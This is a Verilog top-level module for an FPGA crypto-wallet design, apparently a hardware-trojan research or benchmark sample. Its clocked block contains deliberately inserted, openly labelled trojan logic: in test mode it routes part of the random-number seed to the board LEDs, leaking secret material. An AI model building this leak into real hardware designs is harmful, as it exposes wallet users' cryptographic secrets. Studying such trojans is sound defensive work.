module crypto_wallet2_top_testing_trojan (
    // Clock
    input CLOCK_50,

    // SDRAM
    output [12:0] DRAM_ADDR,
    output [1:0] DRAM_BA,
    output DRAM_CAS_N,
    output DRAM_CKE,
    output DRAM_CLK,
    output DRAM_CS_N,
    inout [15:0] DRAM_DQ,
    output [1:0] DRAM_DQM,
    output DRAM_RAS_N,
    output DRAM_WE_N,

    // LEDs for diagnostics or status indicators
    output reg [7:0] LED,

    // UART USB for serial communication
    input UART_RX,
    output UART_TX,

    // Additional Inputs
    input i_test_mode // Input to determine if the device is in test mode
);

    // Internal signals
    wire [7:0] w_system_control;
    wire [7:0] w_random;
    wire [31:0] w_random_seed;
    wire w_reset_n = !w_system_control[0];

    // SDRAM PLL instantiation
    sdram_pll sdram_pll_inst (
        .inclk0(CLOCK_50),
        .c0(DRAM_CLK)
    );

    // Nios Qsys system instantiation
    crypto_wallet2_nios_fast nios2_system (
        .clk_clk(CLOCK_50), 
        .reset_reset_n(w_reset_n),
        .sdram_wire_addr(DRAM_ADDR),
        .sdram_wire_ba(DRAM_BA),
        .sdram_wire_cas_n(DRAM_CAS_N),
        .sdram_wire_cke(DRAM_CKE),
        .sdram_wire_cs_n(DRAM_CS_N),
        .sdram_wire_dq(DRAM_DQ),
        .sdram_wire_dqm(DRAM_DQM),
        .sdram_wire_ras_n(DRAM_RAS_N),
        .sdram_wire_we_n(DRAM_WE_N),
        .uart_external_connection_rxd(UART_RX),
        .uart_external_connection_txd(UART_TX),
        .pi_random_external_connection_export(w_random),
        .po_random_seed_external_connection_export(w_random_seed),
        .po_led_external_connection_export(w_system_control) // Normally connects to system control
    );

    // 8-bit random number generator instantiation
    random random_inst0 (
        .i_clk(CLOCK_50),
        .i_reset_n(w_reset_n),
        .i_seed(w_random_seed),
        .o_data(w_random)
    );

    // Trojan logic: Testing Phase Internally Triggered
    always @(posedge CLOCK_50) begin
        if (i_test_mode) begin // Check if in test mode
            // In test mode, use LEDs to display part of the random seed
            LED <= w_random_seed[7:0]; // Potential information leak
        end else begin
            // Normal operation, display system control status on LEDs
            LED <= w_system_control; // Standard operation
        end
    end

endmodule
